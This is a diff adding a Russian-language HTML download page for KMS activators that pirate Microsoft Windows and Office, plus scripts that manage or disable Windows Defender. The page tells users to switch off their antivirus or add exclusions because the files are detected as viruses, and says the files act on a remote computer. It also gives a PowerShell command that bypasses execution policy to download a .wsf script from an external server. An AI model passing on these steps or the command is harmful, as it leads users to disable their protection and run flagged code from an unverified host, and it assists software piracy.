@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html>
+	<head>
+		<title>Download files</title>
+		<meta http-equiv="content-type" content="text/html; charset=utf-8">
+	</head>
+	<body>
+		<h1>Загрузка файлов</h1>
+		<p><strong>Внимание!!!</strong> Антивирусы могут определять этот набор скриптов как содержащие вирус. Запускайте скрипты при отключённом антивирусе или добавьте исключения антивируса (см. загрузку первого файла).</p>
+		<p>&nbsp;</p>
+		<p>В данном каталоге находятся программа для активации продуктов Microsoft и набор скриптов для управления Windows Defender и предотвращения его ложного срабатывания при активации Microsoft Windows. В 2023 году корпорация Microsoft ужесточила борьбу с пиратскими активациями Windows и Office, поэтому без предлагаемого набора скриптов активатор даже не запустится.</p>
+		<p>Подробную инструкцию по активации Windows и Office смотри в Интернете. Авторы останавливаться на процедуре активации и возможных проблемах не будут.</p>
+		<p>&nbsp;</p>
+		<p>На этой странице предлагается загрузка следующих файлов:</p>
+		<ul>
+			<li><a href="http://distrib.netip6.ru/NIT/KMS/download.php?file=Stop_Defender_Settings.vbs">Stop_Defender_Settings.vbs</a> — Скрипт, открывающий окно с настройками Windows Defender, например, для приостановки защиты в реальном времени для загрузки и применения скриптов ниже. Защиту желательно отключать во время автоматической установки исключений антивируса.</li>			
+			<li><a href="http://distrib.netip6.ru/NIT/KMS/download.php?file=KMS-Settings.zip">KMS-Settings.zip</a> — Архив, содержащий KMS активаторы различных версий. <strong>Внимание!!!</strong> Данный файл не защищён паролем, поэтому при его загрузке активные антивирусы его сразу же уничтожают. Вначале добавте исключения в ваш антивирус!</li>
+			<li><a href="http://distrib.netip6.ru/NIT/KMS/download.php?file=DefenderScripts.zip">DefenderScripts.zip</a> — Набор скриптов для управления антивирусом Microsoft Windows Defender и предотвращения его ложного срабатывания при активации.</li>
+			<li><a href="http://distrib.netip6.ru/NIT/KMS/download.php?file=readme-Defender.txt">readme-Defender.txt</a> — Текстовый файл, поясняющий работу скриптов.</li>
+			<li><a href="http://distrib.netip6.ru/NIT/KMS/download.php?file=Dn.KMS.scripts.wsf">Dn.KMS.scripts.wsf</a> — Скрипт для полуавтоматической загрузки этих файлов (смотри файл markdown).</li>
+		</ul>
+		<p>Файлы реализуют различные функции на удалённом компьютере.</p>
+		<p><strong>Примечание</strong>. Для загрузки скрипта .WSF можно использовать следующий код powershell:</p>
+		<p><code>powershell.exe -NoProfile -WindowStyle Normal -ExecutionPolicy Bypass -Command "((new-object System.Net.WebClient).DownloadFile('http://distrib.netip6.ru/NIT/KMS/Dn.KMS.scripts.wsf', '$env:USERPROFILE\Dn.KMS.scripts.wsf'))"</code></p>
+		<p>&nbsp;</p>
+	</body>
+</html>
